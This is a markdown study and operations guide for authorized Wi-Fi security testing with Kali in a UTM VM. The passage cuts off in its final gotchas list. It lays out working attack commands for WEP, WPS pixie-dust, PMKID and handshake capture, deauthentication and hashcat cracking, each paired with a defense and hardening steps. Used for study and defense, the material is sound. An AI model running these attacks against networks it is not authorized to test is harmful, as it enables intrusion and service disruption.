# Theme: Platform, Troubleshooting, Methodology & Defense

> **Scope & authorization.** AUTHORIZED Wi-Fi security testing only — your own gear,
> sanctioned CTFs/competitions, OSWP (OffSec PEN-210) study. The whole lab is
> **allowlist-gated**: no frame is transmitted at a BSSID/ESSID not on your approved
> list. Every attack below is paired with its **defense**. Evil-twin / WPA-Enterprise
> is **detection + concept only** — this knowledge base never builds a
> credential-phishing harvester.
>
> **Rig assumed throughout:** macOS host → UTM/QEMU → Kali guest → TP-Link
> **RTL8188EUS (2.4 GHz only)** USB adapter → **Mac GPU** for hashcat. Kali *captures*;
> the macOS host *cracks* (the VM has no GPU).
>
> This is the operator's single-screen synthesis of six deep-dive files
> (`adapters-drivers-monitor.md`, `vm-usb-passthrough-troubleshoot.md`,
> `tool-error-troubleshoot.md`, `ctf-oswp-methodology.md`, `blue-team-defense.md`,
> `wifi-pentest-workflow.md`). Read those for depth; read **this** for the order of
> operations, the glue, and the one-liners you reach for mid-competition.

---

## 0. The whole thing on one screen

```
PLATFORM            →  METHODOLOGY                         →  CRACK          →  DEFENSE
adapter+driver         recon → triage → cheapest attack       hashcat           every finding
VM/USB passthrough     (WPS-pixie > PMKID > handshake >        -m 22000          paired with the
monitor + injection     online-WPS) ; WEP instant; SAE/EAP     on Mac GPU        control that kills it
   │  the GATE             separate tracks                        │
   └── aireplay-ng -9 (prove injection) BEFORE anything downstream
```

**Pipeline & where each failure lives:**
```
 CAPTURE                       CONVERT                 CRACK
 airodump-ng / hcxdumptool ──▶ hcxpcapngtool   ──▶     hashcat (-m 22000)
 (monitor mode, injection)     (.pcapng→.hc22000)      aircrack-ng (-w wordlist)
 "0 APs / fixed chan -1 /      "0 EAPOL / 0 PMKID /    "No devices / Token length /
  no handshake"                 no hashes written"      mode 2500 dead"
```
**The #1 triage habit:** decide *which stage* failed before touching any flag. A hashcat
"No hashes loaded" is never fixed at the radio; an airodump "0 packets" is never fixed with
a hashcat option. Bisect: *Did I capture? Convert? Load? Run?*

**Three facts that explain most failures:**
1. **Monitor + injection is a DRIVER property, not a tool property.** If the driver can't,
   no tool in the chain works.
2. **Something is always fighting you for the radio** (NetworkManager, wpa_supplicant,
   dhclient). `airmon-ng check kill` is the first command of every session.
3. **The WPA hash format changed.** `-m 2500`/`.hccapx` is **dead**. Everything is now
   **`-m 22000`** / `.hc22000` from **hcxpcapngtool**. Half of "hashcat won't load my
   handshake" is someone following a 2018 blog.

---

# PART A — PLATFORM (the foundation layer)

Three independent things must all be true before any capture/attack works:
1. **Chipset supports monitor mode** (RFMON → every 802.11 frame on a channel).
2. **Chipset + driver support injection** (transmit raw frames). Monitor and injection are
   **separate capabilities** — many cards sniff but cannot inject.
3. **A driver on your kernel exposes both** — the same chipset is excellent or useless
   depending on which driver binds (mainline `mac80211` vs vendor/staging vs out-of-tree DKMS).

**Buy the chipset, not the product name.** The TP-Link **WN722N** is the cautionary tale:
**v1 = Atheros AR9271** (gold standard, injects out of the box) vs **v2/v3 = Realtek
RTL8188EUS** (`0bda:8179`, out-of-tree driver dance). Same box, different silicon.

## A1. Identify the hardware FIRST, every time
```bash
lsusb                              # VID:PID — e.g. 0bda:8179 (RTL8188EUS), 0cf3:9271 (AR9271)
lsusb -vv -d 0bda:8179 | grep -iE 'idVendor|idProduct|iProduct|Driver'
sudo dmesg --ctime | grep -iE 'usb|rtl8|rtw|ath9k|carl9170|mt76|mt79|ieee80211|firmware'
iw list | sed -n '/Supported interface modes/,/Supported commands/p'   # look for: * monitor
iw dev                             # the netdev the driver created (wlan0, wlan1…)
```
**VID:PID quick map:** `0cf3:9271`→AR9271 (`ath9k_htc`, ideal) · `0bda:8812`→RTL8812AU
(out-of-tree 88XXau) · `0bda:f179`/`0bda:8179`→RTL8188EUS family · `148f:5370/3070`→Ralink
(`rt2800usb`) · `0e8d:7612`→MT7612U (`mt76x2u`) · `0e8d:7961`→MT7921AU (`mt7921u`).

**Pro buy order for an authorized lab:** AR9271 (AWUS036NHA, guaranteed 2.4 GHz injection,
zero driver drama) → MT7612U (AWUS036ACM, cleanest dual-band, mainline) → RTL8812AU
(AWUS036ACH, cheap dual-band but DKMS maintenance) → keep RTL8188EUS as the cheap 2.4 GHz
backup. **Avoid** Broadcom (no monitor/injection), most internal Intel (injection
unreliable), RTL8723/8188CUS/8192CU.

## A2. Drivers — golden rule: try the in-kernel driver first
If `iw list` already shows `* monitor` and `aireplay-ng -9` passes, **install nothing** —
you avoid the DKMS-breaks-on-kernel-update treadmill entirely.

DKMS build prereqs on Kali (header/kernel mismatch is the #1 "`make` fails" cause — headers
**must** match `uname -r` exactly):
```bash
sudo apt update
sudo apt install -y build-essential bc dkms git linux-headers-$(uname -r) libelf-dev
```

**RTL8188EUS (your adapter) — three candidate drivers conflict:**

| Module     | Source                                  | Monitor + injection? |
|------------|-----------------------------------------|----------------------|
| `r8188eu`  | in-kernel (staging→mainline)            | unreliable / no      |
| `rtl8xxxu` | in-kernel generic Realtek               | **not** for 8188eus  |
| `8188eu`   | out-of-tree (aircrack-ng/morrownr), DKMS| **yes**              |

```bash
# A) see what bound; test the in-kernel path before installing anything
sudo dmesg | grep -iE 'r8188eu|rtl8xxxu|rtl8188'
iw list | grep -i monitor
# B) install the good out-of-tree driver via DKMS (survives kernel upgrades — preferred in a VM)
sudo apt install -y realtek-rtl8188eus-dkms          # Kali's packaged driver (try first)
#   or build from source:
git clone https://github.com/aircrack-ng/rtl8188eus && cd rtl8188eus
make -j"$(nproc)" && sudo make install
# C) CRITICAL — blacklist the conflicting in-kernel modules (or the wrong driver grabs it at boot)
sudo tee /etc/modprobe.d/realtek-wifilab.conf >/dev/null <<'EOF'
blacklist r8188eu
blacklist rtl8xxxu
EOF
sudo depmod -a ; sudo update-initramfs -u ; sudo reboot
```
A *source* build does **not** rebuild on a kernel upgrade (DKMS does) — else `wlan0` silently
vanishes after reboot. For AR9271 the layer is a non-event (`sudo apt install firmware-atheros`
if `dmesg` shows a firmware-load failure). For MT76 prefer in-kernel +
`sudo apt install firmware-misc-nonfree`.

## A3. Monitor mode — the canonical sequence
```bash
# Path A — airmon-ng (standard). check kill FIRST or NetworkManager yanks the card back.
sudo airmon-ng check kill
sudo airmon-ng start wlan0         # creates wlan0mon, OR sets monitor in-place keeping wlan0
iw dev                             # READ the real name — don't assume wlan0mon
# Path B — iw manual (cleanest for scripts / hcxdumptool; avoids a full radio reset)
sudo airmon-ng check kill
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
iw dev wlan0 info                  # confirm: type monitor
sudo iw dev wlan0 set channel 6    # monitor mode does NOT auto-hop; pin the target channel
```
Restore networking: `sudo airmon-ng stop wlan0mon ; sudo systemctl restart NetworkManager`.

## A4. Injection test — THE GATE (`aireplay-ng -9` / `--test`)
Run this immediately after monitor mode — **not** after an hour of "why did the deauth do
nothing." If it passes, the adapter+driver+antenna chain is good and you proceed; if not,
**stop and fix the adapter layer.**
```bash
sudo aireplay-ng -9 wlan0mon                 # -9 == --test ; "Injection is working!" + APs + 30/30:100%
sudo aireplay-ng -9 -i wlan1mon wlan0mon     # card-to-card: catches silent frame-mangling a 1-card test misses
sudo aireplay-ng --test -e <ESSID> -a <BSSID> wlan0mon   # per-target injection quality
```
**`No Answer / Found 0 APs` is a hint, not a verdict** — rule out in order: (1) wrong/idle
channel → pin a channel with a known AP; (2) not actually monitor (`iw dev`); (3) `check kill`
not run; (4) driver can't inject in this mode (wrong RTL fork / vendor driver bound); (5)
regulatory TX cap; (6) no APs in range → use the card-to-card test. **ASCII-hyphen gotcha:**
web pages render `--test` as an en-dash `—test` → shell error. Retype two plain hyphens.

## A5. VM / USB passthrough (macOS → UTM/QEMU → Kali) — the Mac gatekeeper
Four fragile seams, each a distinct failure class. Master decision tree when "my adapter
vanished":
```
A. macOS gatekeeper allowing it?        → Privacy & Security ▸ Accessories ▸ "Allow…when unlocked"
B. On the QEMU backend with USB on?     → NOT Apple Virtualization (no reliable Wi-Fi passthrough)
C. Does macOS still hold the device?    → system_profiler SPUSBDataType | grep -i realtek
D. Attached to the VM?                   → utmctl usb list "Kali"  /  UTM USB toolbar menu
E. Guest sees it on the bus?             → lsusb   (expect 0bda:8179)
F. Kernel bound a driver?                → dmesg | tail ; lsmod | grep 8188
G. Is there a wlanX interface?           → ip link ; iw dev
```
- **macOS "Allow accessories to connect"** (Apple-silicon Ventura+): set to *Automatically
  allow when unlocked*. The #1 "works on my Intel Mac, not my M-series" cause.
- **Backend:** QEMU (ARM64), **not** Apple Virtualization. Only the QEMU backend exposes the
  USB pane, the toolbar USB menu, and `utmctl usb`.
- **USB controller:** start with **USB 2.0 (EHCI)** for the 2.4 GHz dongle — known-good
  Apple-Silicon passthrough runs over EHCI/UHCI, not XHCI. This single change fixes most
  random drops. **No USB hubs** (QEMU: hubs "won't work", `-71`/`-110` errors) — plug direct,
  same port every time.
- **Attach AFTER the guest boots**, not before (pre-boot attach → half-enumeration: "driver
  loads, no interface").
```bash
alias utmctl='/Applications/UTM.app/Contents/MacOS/utmctl'   # needs a GUI login session, not bare SSH
utmctl start "Kali"
utmctl usb list "Kali"                       # confirm 0bda:8179 present, not yet connected
utmctl usb connect "Kali" 0bda:8179          # bind by VID:PID — survives re-enumeration (bus/addr does not)
```
**"Passthrough drops / driver reload breaks it":** a USB reset (airmon-ng, `modprobe -r`,
sleep, hub glitch) re-enumerates the device on a new address and QEMU loses the handle. Fixes:
prefer `iw` over tools that fully reset the radio; disable USB autosuspend; keep the Mac awake;
re-attach by VID:PID. One-keystroke recover:
```bash
# host:
utmctl usb disconnect "Kali" 0bda:8179 ; sleep 1 ; utmctl usb connect "Kali" 0bda:8179
caffeinate -dimsu -w "$(pgrep -n -f QEMU)" &          # don't let the Mac nap mid-capture
# guest — kill autosuspend persistently:
sudo tee /etc/udev/rules.d/70-wifilab-nosuspend.rules >/dev/null <<'EOF'
ACTION=="add", SUBSYSTEM=="usb", ATTR{idVendor}=="0bda", ATTR{idProduct}=="8179", TEST=="power/control", ATTR{power/control}="on"
EOF
sudo udevadm control --reload
```
**Integrity:** Apple-Silicon QEMU Linux VMs have had disk-corruption bugs — use **NVMe (any
cache)** or **VirtIO "cached"** for the disk, snapshot a known-good Kali (driver + blacklist +
udev rule set), and always shut down gracefully. Wire a **serial console** (UTM ▸ Devices ▸
Serial; aarch64 = `ttyAMA0`, `serial-getty@ttyAMA0`) on day one so a frozen guest still gives
you a login and the panic text.

---

# PART B — METHODOLOGY (the funnel, mid-competition)

**Mindset:** a decision tree, not a tool list. The beacon advertises the target's weaknesses
(WPS bit, cipher, PMKID support, client count). Read those, then spend transmit budget on the
**cheapest attack that works** for *that* target. You are graded on **method, speed, and
proof**.

**Canonical pro ordering (lowest effort / highest yield first):**
```
WPS pixie-dust  >  PMKID (client-less)  >  WPA handshake (deauth a client)  >  online WPS PIN
   seconds           seconds-min               needs a client                hours, noisy, lockout
```
WEP is instant & deterministic (do it the moment you see `ENC=WEP`). WPA3-SAE and
WPA2/3-Enterprise are separate tracks at the "select attack" stage.

## B0. Exam/competition clock — triage discipline wins, not depth

| Phase | Budget | Goal |
|---|---|---|
| Recon (all targets) | first 15–20 min | one `airodump` sweep → table: cipher, WPS, clients, signal |
| Per-target triage | 2–3 min each | pick the attack from the tree — don't start cracking yet |
| Quick wins first | front-load | WEP, WPS-Pixie, PMKID-on-weak-PSK — anything finishing in minutes |
| Slow attacks | background | long dict/mask cracks on the GPU **while you work another target** |
| Documentation | rolling | screenshot the moment the key pops — never "at the end" |

**Golden rules:** breadth before depth (two fully-documented beats three half-done); every
attack runs in parallel with thinking (a `tmux` pane per target, GPU cracking while you
enumerate the next AP); document *at the moment of success*; don't rabbit-hole (expected value
per minute, always); keep a `results.md` per target (BSSID, channel, cipher, attack, status,
key) — it becomes the report.
```bash
tmux new -s wifi   # pane1: airodump recon  pane2: capture A  pane3: hashcat  pane4: notes
```

## B1. Preflight (do this before the clock matters)
```bash
sudo airmon-ng check kill        # stop NetworkManager + wpa_supplicant (THE #1 beginner failure if skipped)
sudo airmon-ng start wlan0 ; iw dev            # confirm the real monitor iface name
sudo aireplay-ng -9 wlan0mon                   # PROVE injection (the gate — Part A4)
sudo iw reg set US ; iw reg get                # regulatory domain → legal channels + TX power
```
**RTL8188EUS reality:** 2.4 GHz only (ch 1–14). All 5/6 GHz APs are invisible — note that as a
**coverage gap in every report**. Confirm the target band from the beacon before burning time.

## B2. Phase 1 — Recon (passive, zero transmit)
```bash
sudo airodump-ng --band bg wlan0mon                               # full 2.4 GHz sweep
sudo airodump-ng --band bg -w recon --output-format pcap,csv,netxml wlan0mon   # write for parsing
sudo airodump-ng -c 1,6,11 wlan0mon                               # dwell on the real 2.4 GHz channels
```
Read: **CH** (you'll lock to it), **ENC/CIPHER/AUTH** (WPA2/WPA3, CCMP/TKIP, PSK vs **MGT**=
Enterprise, **SAE**=WPA3), **PWR** (closer = cleaner capture), and whether the AP has
**associated clients** (needed for deauth handshake).

**Scope reconciliation — the step amateurs skip (allowlist gate belongs HERE):**
```bash
awk -F, 'NR>1 && $1 ~ /:/ {print $1, $14}' recon-01.csv | sort -u > seen.txt
grep -iF -f allowlist.txt seen.txt > in-scope.txt     # everything you transmit at must be in here
```

## B3. Phase 2+3 — Enumerate & select (decision tree)
```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w target wlan0mon   # lock channel+BSSID, full frames
sudo wash -i wlan0mon -c 6 -s                                        # WPS: version, Locked, vendor
sudo hcxdumptool -i wlan0mon --rcascan                               # which APs answer association (PMKID-able)
```
```
ENC = WEP ───────────────────────► §C1  ARP-replay IVs → aircrack (minutes)
WPS set & Lck=No (wash) ─────────► §C2  PIXIE-DUST first (offline, seconds) → else online PIN (park it)
WPA/WPA2-PSK ────────────────────► §C3  PMKID (clientless) → else deauth+handshake → hashcat -m 22000
AUTH = MGT (802.1X/EAP) ─────────► §C4  DETECT + concept only (cert-validation defense)
WPA3-SAE ────────────────────────► §C5  no offline PSK path; check transition mode → attack WPA2 side; else move on
```
**Rationale:** pixie-dust is offline and yields the PSK directly (no wordlist); PMKID is
client-less and quiet; handshake needs a client to deauth; online WPS PIN is slow, noisy,
lockout-prone.

## B4. Phase 5 — Crack offline (move off-radio, hit the Mac GPU)
Everything converges on hashcat mode **22000**. **Kali captures, macOS host cracks** (no GPU in
the VM).
```bash
# convert (PMKID *and* EAPOL both land in .hc22000). NEVER wpaclean/merge pcapng first.
hcxpcapngtool -o hash.hc22000 dump.pcapng
# filter to scope at the hash layer too (note: hcxhashtool uses --mac-ap, NOT --bssid):
hcxhashtool -i hash.hc22000 --mac-ap=AABBCCDDEEFF -o target.hc22000
hcxhashtool -i hash.hc22000 --essid=CorpWifi      -o target.hc22000
# attack ladder (fast → slow):
hcxpsktool -i hash.hc22000 | sort -u > candidates.txt      # instant wins from the capture itself
hashcat -m 22000 target.hc22000 candidates.txt
hashcat -m 22000 target.hc22000 rockyou.txt
hashcat -m 22000 target.hc22000 rockyou.txt -r rules/best64.rule
hashcat -m 22000 target.hc22000 -a 3 ?d?d?d?d?d?d?d?d       # 8-digit (common router default) — ESTIMATE keyspace first
hashcat -m 22000 target.hc22000 -a 6 rockyou.txt ?d?d?d?d   # word+digits (common PSK shape)
hashcat -m 22001 target.hc22000 <PMK>                      # verify a known 64-hex PMK
```
Standard flags: `--status --status-timer=30`, `--session=job1 --restore` + `-S` (resumable —
piped input has no restore point), `--potfile-path=lab.potfile` (keep engagements separate),
`hashcat -I` / `-b -m 22000` (devices/bench). **Modes note:** 22000 supersedes the deprecated
2500 (hccapx) and 16800 (PMKID-only). `-O` optimized kernels **cap password length** (≈55) — a
longer passphrase will never be found. `-w` workload profile has **no effect** in current
hashcat; tune `-n`/`-u` instead.

## B5. Phase 6 — Report (findings as risk, each with a defense)
Per finding: **Target** (ESSID/BSSID/ch + allowlist ref) · **Severity** · **Evidence**
(hc22000 line redacted, `hashcat --show`, timestamps) · **Reproduction** (exact commands +
wordlist) · **Time-to-crack** (quantifies real-world risk) · **Impact** · **Remediation** (the
specific paired defense). State coverage gaps explicitly (**RTL8188EUS = 2.4 GHz only; 5 GHz
not assessed**). Record a failed attempt too — absence of a finding is a finding. Redact
recovered secrets; store raw material encrypted.

---

# PART C — ATTACK-BY-ATTACK (method · commands · gotchas · defense)

## C1. WEP — do it first, it's deterministic (broken by IV volume, not guessing)
```bash
sudo airodump-ng -c <CH> --bssid <BSSID> -w wep wlan0mon        # NO --ivs (replay needs full frames)
sudo aireplay-ng --fakeauth 0 -e "<ESSID>" -a <BSSID> wlan0mon  # if no client
sudo aireplay-ng --arpreplay -b <BSSID> -h <YOUR-MON-MAC> wlan0mon   # pump IVs; add -x 50 to throttle
sudo aireplay-ng --deauth 5 -a <BSSID> -c <CLIENT-MAC> wlan0mon # nudge a client to emit an ARP
sudo aircrack-ng -b <BSSID> wep-01.cap                          # PTW, run LIVE against the growing file
```
**Gotcha:** `--ivs` strips the frames ARP-replay needs — never for WEP. **Pro tip:** start
aircrack while airodump is still filling; it pops the key the instant enough IVs exist.
**Defense:** WEP is dead (RC4 key reuse + PTW). No safe config — migrate to WPA2-AES (CCMP) at
minimum, WPA3-SAE where supported.

## C2. WPS — Pixie-Dust first, online brute last resort
```bash
sudo wash -i wlan0mon            # Lck=No on Ralink/Broadcom/Realtek = prime pixie candidate
# Pixie-dust (OFFLINE, seconds-min — weak E-S1/E-S2 nonce entropy, no PIN guessing):
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -K -vv      # -K == --pixie-dust ; reaver feeds pixiewps
sudo bully  -b <BSSID> -c <CH> -d wlan0mon             # -d == --pixiewps
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -p <8-DIGIT-PIN> -vv   # once PIN known → pull the PSK
# Online PIN brute (SLOW — park it, don't babysit; only 11,000 combos but rate-limited):
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -vv -d 2 -r 3:60 -T 0.40 -N   # gentle, avoid lockout
```
**Gotchas:** never `-S`/`--dh-small` against Realtek (breaks buggy routers, wastes the attempt;
pixiewps now marks `-S` deprecated). If `wash` shows `Lck=Yes` or reaver reports repeated `WPS
transaction failed`, pixie already failed and the AP is rate-limiting → **move on**, let a PSK
attack carry it. **Defense:** **disable WPS entirely** (especially external-registrar PIN).
There is no safe WPS; verify with `wash` after every firmware upgrade/factory reset (it often
re-enables).

## C3. WPA/WPA2-PSK — PMKID then handshake (bread-and-butter)
```bash
# 3a. PMKID (clientless — try first; one frame from the AP). hcxdumptool owns its own monitor+MAC.
sudo systemctl stop NetworkManager wpa_supplicant
sudo hcxdumptool -i wlan0 -w dump.pcapng --rds=1 -F
#   MANDATORY BPF scoping when you can't fully control the RF env (this IS the allowlist at the radio):
sudo hcxdumptool -i wlan0mon --bpfc="wlan addr3 AA:BB:CC:DD:EE:FF" -w dump.pcapng
#   trim its 3 default attacks as authorization requires: --associationmax=0 --disable_disassociation --m2max=0

# 3b. 4-way handshake (when a client exists) — airodump + MINIMAL deauth
sudo airodump-ng -c <CH> --bssid <BSSID> -w psk wlan0mon        # NO --ivs
sudo aireplay-ng -0 1 -a <BSSID> -c <CLIENT-MAC> wlan0mon       # ONE burst — over-deauth stops reconnect
#   confirm BEFORE tearing down: airodump shows "WPA handshake: <BSSID>", or Wireshark filter `eapol` (M1+M2 or M2+M3 is enough)
aircrack-ng psk-01.cap                                          # "1 handshake" = good
```
**hcx hard rules (each a silent failure if ignored):** never `wpaclean`, never merge pcapng
files, never run on a virtual iface, never alongside aircrack/reaver/bully on the same radio,
never `macchanger`. hcx does **no nonce-error correction** — packet loss yields a wrong PTK and
the correct password *never* matches, so capture cleanly (close, minimal deauth).
**Defense:** a **≥20-char random, non-dictionary PSK** makes the captured hash
computationally useless (capture succeeds, crack never finishes) — this is the real control
since PMKID is one unauthenticated frame. Add **802.11w (PMF)** to blunt deauth, move to
**WPA3-SAE** (not offline-crackable), disable PMKID caching, never reuse a PSK across SSIDs
(consider per-device/iPSK).

## C4. WPA-Enterprise (802.1X / EAP) — DETECTION + concept ONLY
**Detect:** `airodump` `AUTH` column reads **`MGT`** = RADIUS-backed 802.1X, no shared PSK to
crack. **Concept (why the downgrade matters):** a rogue AP running a weak inner method
(PEAP/EAP-MSCHAPv2) can trick a *mis-configured* client into leaking a challenge/response;
MSCHAPv2 collapses to a single DES keyspace and cracks offline (hashcat **mode 5500**). The
tooling exists (`eaphammer`); **do not operate it against real users** — only against lab
clients you own and control, in scope. **Defense (the point of this section):** clients
**must validate the RADIUS server certificate** and pin CA + server name (defeats the entire
rogue-AP/downgrade class), prefer **EAP-TLS** (mutual certs, no password to steal) over
PEAP/MSCHAPv2, enable PMF, monitor for duplicate ESSIDs and RADIUS auth spikes.

## C5. WPA3-SAE — know the limits
**SAE (Dragonfly PAKE)** replaces the offline-crackable handshake — capturing frames yields
**nothing** testable offline; there is no hashcat mode for a WPA3-SAE PSK. The practical
opening is **transition mode** (an AP advertising *both* WPA2 and WPA3) → attack the WPA2 side
as in C3. Dragonblood side-channels are implementation-specific, out of scope for a standard
dictionary workflow. **Decision rule in a timed event:** a pure WPA3-SAE target with no
transition mode is low-EV — note it and spend the minutes on a WEP/WPS/PSK target you can
finish. **Defense:** WPA3-SAE only (disable transition mode once clients support it), H2E
(`sae_pwe=1`), PMF mandatory, keep firmware current for Dragonblood fixes.

---

# PART D — TROUBLESHOOTING (error → fix, in triage order)

**Master flow — run top-to-bottom the moment something breaks; the first line that fails is
your bug:**
```
0.  rfkill list                                    # radio blocked? → rfkill unblock all
1.  ip link / iw dev                               # interface exists? right name?
2.  iw dev <if> info                               # type monitor? what channel?
3.  airmon-ng check                                # who's fighting me? → check kill
4.  iw list | grep -A8 "Supported interface modes" # monitor supported?
5.  airodump-ng -c <ch> --bssid <AP> -w t <if>     # do I see beacons?
6.  aireplay-ng --test <if>                         # injection + which APs ACK?
7.  hcxpcapngtool -o t.hc22000 t.pcapng            # EAPOL/PMKID count > 0?
8.  hashcat -m 22000 t.hc22000 --show              # parses without error?
9.  hashcat -I ; hashcat -b -m 22000               # GPU present + benches?
```

**CAPTURE stage (airodump):**
- **Exits / "Aborted":** wrong iface (use the *monitor* name), rfkill (`rfkill unblock all`),
  stale monitor iface (tear down & rebuild), `-w` path missing (`mkdir -p` first), or the
  adapter came back as a different `wlanX` after USB re-enumeration — resolve the name at
  runtime, don't hard-code `wlan0mon`.
- **`fixed channel wlan0mon: -1`:** another process changed the channel. `check kill`; lock a
  channel (`-c 6`). **RTL8188EUS quirk:** the out-of-tree driver reports channel oddly, so
  `-1` appears even when capture is fine → if data flows it's cosmetic, add
  `--ignore-negative-one`; if data is missing it's a real fight → `check kill`.
- **0 APs / 0 packets:** not actually monitor; hopping (lock `-c`); **wrong band — the
  RTL8188EUS is 2.4 GHz only, a 5 GHz target is invisible forever**; powersave
  (`sudo iw dev wlan0 set power_save off`); dropped USB passthrough (`dmesg|tail`, `lsusb`).
- **Handshake never appears:** must be on the AP's exact channel; need a client that
  (re)connects; never `--ivs`; a `--bssid` filter can drop analysis packets; confirm in
  Wireshark (`eapol`, 1→4).
- **`SIOCSIFFLAGS: Unknown error 132`:** rfkill block → `rfkill unblock all`.

**hcxdumptool:** README states "Unsupported: …emulators or wrappers!" — it's a *timing*
reliability warning, not a hard block; it usually runs in Kali-in-UTM but less reliably. If
PMKID/EAPOL capture is flaky in the VM, prefer **airodump + targeted deauth** (more forgiving).
Requires kernel ≥ 5.15, an in-tree driver (the 8188eus is out-of-tree → it may warn; fall back
to the airodump path, the convert+crack half works regardless). Keep hcxdumptool and
hcxpcapngtool the **same version** (skew silently corrupts). Old v6 flags were removed —
`hcxdumptool --help` is the only authority.

**CONVERT stage (hcxpcapngtool):** read the SUMMARY for non-zero PMKID / EAPOL written.
- **0 EAPOL / 0 PMKID:** the capture has no usable material — bug is upstream (C3), not here.
- **Known-good password never cracks:** nonce/packet-loss corruption (no nonce-error
  correction) → recapture cleaner, prefer M1+M2 / M2+M3 pairs.
- **Hashes gone after merging:** never `cat` pcapng files — convert each separately; only the
  **`.hc22000` text** is safe to `cat` together.

**CRACK stage (hashcat):**
- **"No OpenCL/HIP/CUDA platform found":** no runtime. On Mac use the native Metal/OpenCL build
  (`brew install hashcat`; `hashcat -I`) — a common cause is an x86 build under Rosetta.
- **"No devices found/left":** a device was excluded — drop stale `-d`/`--backend-devices`;
  start a real run to see the skip reason; CPU is off by default (`-D 1`).
- **`Token length exception`:** wrong `-m` **or the file path doesn't exist** (hashcat treats
  the filename as a hash) → verify path + `-m 22000`.
- **"No hashes loaded":** empty file / all filtered (`wc -l`); **`-m 2500`/hccapx is dead** →
  convert to 22000 (do **not** `--deprecated-check-disable`).
- **Watchdog kill (CUDA 702 / `CL_OUT_OF_RESOURCES`):** lower `-n`/`-u`, use a non-display GPU,
  or split the keyspace into sessions.
- **Slower with more networks:** expected — each network is its own salt; cracked salts drop
  out and the rest speeds up.

**aircrack-ng cracking:** "No valid WPA handshakes" = wrong channel/mode at capture, interferer,
`--ivs` used, or a `--bssid` filter dropped ACKs → recapture. aircrack is CPU-only (~50–300
keys/s) — use it to *verify a handshake exists*, then convert to 22000 and crack on the GPU.

**Deauth not yielding a handshake:** client too far (watch `[ACKs from client]` = 0 means not
heard), card in a different mode than the client, client ignores broadcast (use `-c` targeted),
or reconnects too fast. Keep airodump running on the channel; send a **small** count; less is
more. Authorized targets only.

---

# PART E — DEFENSE (the whole toolkit, closed)

**One-line thesis:** *WPA3-only + PMF required + a long random passphrase (or 802.1X with real
cert validation) + WPS off + segmentation + a monitor-mode Kismet sensor = the attacker's
entire offline/downgrade/deauth toolkit stops working.*

**Attack → control → verify:**

| Attack | What closes it | Verify (on the air) |
|---|---|---|
| 4-way handshake offline crack | WPA3-SAE / ≥20-char random PSK | AKM=SAE; passphrase entropy audit |
| PMKID attack | WPA3-SAE / disable PMKID caching / patched AP | `hcxdumptool` against own AP yields no PMKID |
| Deauth/disassoc DoS | **PMF required** (`ieee80211w=2`) | deauth test leaves client associated |
| KRACK / Kr00k / FragAttacks | **patch** client + AP firmware/driver | version audit ≥ fixed |
| Evil-twin / downgrade | **WPA3-only + PMF**; SAE-PK; 802.1X cert pinning | Kismet APSPOOF; baseline diff |
| WPS PIN / Pixie-Dust | **disable WPS** | `wash` shows nothing for your BSSID |
| Enterprise EAP relay | **EAP-TLS** or pinned-CA PEAP/TTLS; strong creds | client profile locks CA + server name |

**Hardening runbook (top to bottom):**
1. **Inventory & baseline** (`airodump --essid` + `wash` → record BSSIDs, AKM, PMF, WPS, channel,
   RSSI). This is both the to-do list and the WIDS baseline.
2. **Patch everything** — closes KRACK, Kr00k, FragAttacks, Dragonblood in one move.
3. **WPA3-only + PMF required.** hostapd: `wpa_key_mgmt=SAE` (not `WPA-PSK SAE` = transition),
   `rsn_pairwise=CCMP` (never TKIP), `ieee80211w=2`, `sae_pwe=1` (H2E only, Dragonblood-safe),
   `sae_require_mfp=1`. Legacy clients → their own soon-to-die VLAN'd SSID, not the main one.
4. **Kill WPS** (remove all `wps_*`/`eap_server` lines; re-verify with `wash` after any reset).
5. **Real passphrase** (≥20 random or 6 Diceware ≈ 70+ bits) or **802.1X with pinned-CA client
   profiles** pushed by MDM/GPO (never the user "trust" prompt). `openssl rand -base64 18 | tr -d '/+=' | cut -c1-20`.
6. **Segment:** guest/IoT VLANs (internet-only), client isolation (`ap_isolate=1`), isolated
   management plane, wired-side DHCP snooping / DAI.
7. **Stand up the sensor:** `sudo kismet -c wlan0mon` with alerts `APSPOOF`, `DEAUTHFLOOD`,
   `BCASTDISCON`, `CHANCHANGE`, plus an `apspoof=` rule listing your valid BSSIDs; nzyme for a
   persistent evil-twin fingerprint record.
8. **Automate the audit** — daily re-check of 3–4 against the baseline, alert on drift.
9. **Re-test from the attacker side** (authorized) and confirm each attack now fails or alerts.

**Prove, don't assume (verification one-liners):**
```bash
# AKM + PMF of your own BSS (akm 8=SAE, mfpr 1=required; if you also see akm 2 you're in transition):
sudo tshark -i wlan0mon -Y 'wlan.ssid=="LAB-SECURE" && wlan.fc.type_subtype==0x08' \
  -T fields -e wlan.rsn.akms.type -e wlan.rsn.capabilities.mfpr
sudo wash -i wlan0mon | grep -i <YOUR_BSSID>                          # WPS off? → must be empty
sudo aireplay-ng --deauth 5 -a <YOUR_BSSID> -c <YOUR_CLIENT> wlan0mon  # PMF test: client should STAY up
sudo airodump-ng wlan0mon --essid "LAB-SECURE"                        # >1 BSSID for your SSID = rogue/evil-twin
sudo tshark -i wlan0mon -q -z io,stat,10,'COUNT(frame)wlan.fc.type_subtype==0x0c'   # deauth-flood rate
```
Use the attacker's own tools as the verifier: `hcxdumptool` that yields no PMKID,
`aireplay-ng --deauth` that doesn't drop the client, `wash` that shows nothing — each is a
green check that a control holds. **Gotchas:** "WPA3 enabled" but still transition mode (go
WPA3-*only*); PMF "optional" (`=1`) ≠ protected; `ieee80211w=2` kicks non-capable IoT (stage
via `=1`); WPS checkbox lies / returns after reset; a strong-but-shared PSK means one capture
breaks all; TKIP anywhere is broken; `sae_pwe=0` (H&P) re-opens Dragonblood; containment deauth
is regulated — prefer detect-only.

---

# PART F — CONSOLIDATED GOTCHAS & PRO TIPS

**Top time-sinks:** skipped `airmon-ng check kill` (NetworkManager retunes mid-capture) · used
`--ivs` on WEP/WPA · over-deauthed (client can't reconnect) · merged/`wpaclean`'d pcapng before
convert · ran hcxdumptool with macchanger/on a vif/alongside aircrack · brute-forced a
full-charset 8-char mask without estimating keyspace (years vs minutes) · online WPS brute vs a
locked AP · **5 GHz target + 2.4 GHz-only RTL8188EUS** · never verified the handshake before
